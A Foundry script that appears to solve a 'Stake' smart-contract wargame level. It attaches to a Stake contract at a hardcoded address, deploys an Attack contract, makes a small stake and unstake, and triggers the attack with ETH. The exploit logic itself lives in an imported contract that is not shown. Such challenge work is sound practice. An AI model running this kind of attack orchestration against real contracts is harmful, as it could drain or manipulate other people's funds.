// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Stake, Attack, WETH} from "../src/Stake.sol";


contract StakeScript is Script {
    Stake public stakeContract;
    Attack public attack;
    // WETH public weth;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        // weth = new WETH();
        address weth = 0xCd8AF4A0F29cF7966C051542905F66F5dca9052f;
        // stakeContract = new Stake(address(weth));
        stakeContract = Stake(0x3968b7f9027C8a8965848A1C1C91083477472b5d);
        attack = new Attack(weth, stakeContract);
        // weth.mint(address(attack));
            
        // stakeContract = new Stake(address(attack));
        // stakeContract = Stake(0x17e6a22412CC753F9B8c1FF92fBA0f2bcc2B86FD);

        // currently the total stakes is 0, add some stakes through the stakeContract
        address(stakeContract).call{value: 0.001 ether + 1}(abi.encodeWithSignature("StakeETH()"));
        address(stakeContract).call(abi.encodeWithSignature("Unstake(uint256)", 0.001 ether + 1));


        attack.attack{value: 0.001 ether + 2}(); 


        vm.stopBroadcast();
    }
}
